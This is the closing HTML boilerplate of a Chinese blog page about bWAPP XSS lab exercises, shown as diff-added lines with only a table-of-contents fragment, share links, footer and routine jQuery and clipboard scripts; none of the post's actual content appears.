href="#存储型"><span class="toc-number">2.2.</span> <span class="toc-text">存储型</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#blog"><span class="toc-number">2.2.1.</span> <span class="toc-text">blog</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#代码分析-9"><span class="toc-number">2.2.1.1.</span> <span class="toc-text">代码分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#low-10"><span class="toc-number">2.2.1.2.</span> <span class="toc-text">low</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#mid-7"><span class="toc-number">2.2.1.3.</span> <span class="toc-text">mid</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#high-9"><span class="toc-number">2.2.1.4.</span> <span class="toc-text">high</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Change-Secret-HTML-hidden-注入"><span class="toc-number">2.2.2.</span> <span class="toc-text">Change Secret(HTML hidden)注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#代码分析-10"><span class="toc-number">2.2.2.1.</span> <span class="toc-text">代码分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#low-11"><span class="toc-number">2.2.2.2.</span> <span class="toc-text">low</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#mid-high-3"><span class="toc-number">2.2.2.3.</span> <span class="toc-text">mid&#x2F;high</span></a></li></ol></li></ol></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2020/09/27/bWAPP-XSS/" target="_blank" rel="noopener"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2020/09/27/bWAPP-XSS/&text=bWAPP-XSS" target="_blank" rel="noopener"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2020/09/27/bWAPP-XSS/&title=bWAPP-XSS" target="_blank" rel="noopener"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2020/09/27/bWAPP-XSS/&is_video=false&description=bWAPP-XSS" target="_blank" rel="noopener"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=bWAPP-XSS&body=Check out this article: http://yoursite.com/2020/09/27/bWAPP-XSS/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2020/09/27/bWAPP-XSS/&title=bWAPP-XSS" target="_blank" rel="noopener"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2020/09/27/bWAPP-XSS/&title=bWAPP-XSS" target="_blank" rel="noopener"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2020/09/27/bWAPP-XSS/&title=bWAPP-XSS" target="_blank" rel="noopener"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2020/09/27/bWAPP-XSS/&title=bWAPP-XSS" target="_blank" rel="noopener"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2020/09/27/bWAPP-XSS/&name=bWAPP-XSS&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=http://yoursite.com/2020/09/27/bWAPP-XSS/&t=bWAPP-XSS" target="_blank" rel="noopener"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    1970-2021
+    Tansz
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/projects_url">项目</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+
+    <!-- jquery -->
+
+<script src="/lib/jquery/jquery.min.js"></script>
+
+
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+
+<!-- clipboard -->
+
+  
+<script src="/lib/clipboard/clipboard.min.js"></script>
+
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
